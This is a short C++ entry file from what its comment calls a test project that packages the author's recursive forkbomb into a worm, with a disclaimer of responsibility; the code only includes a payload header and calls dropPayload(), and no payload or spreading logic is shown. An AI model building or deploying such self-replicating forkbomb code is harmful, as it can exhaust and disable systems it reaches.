/*
NOTE: THIS IS A TEST PROJECT THAT IMPLEMENTS MY WMOSYSBOOT RECURSIVE FORKBOMB AND PACKAGES IT INTO A WORM
THIS IS NOT INTENTED TO BE MALICIOUS BUT TO SEE HOW FAST IT CAN REPLICATE.
I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS.
*/
#include <iostream>
#include "Files.h"
#include "Payload.h"
using namespace std;
int main(){
	cout << "Dropping payload of: " << dropPayload() << endl;
}

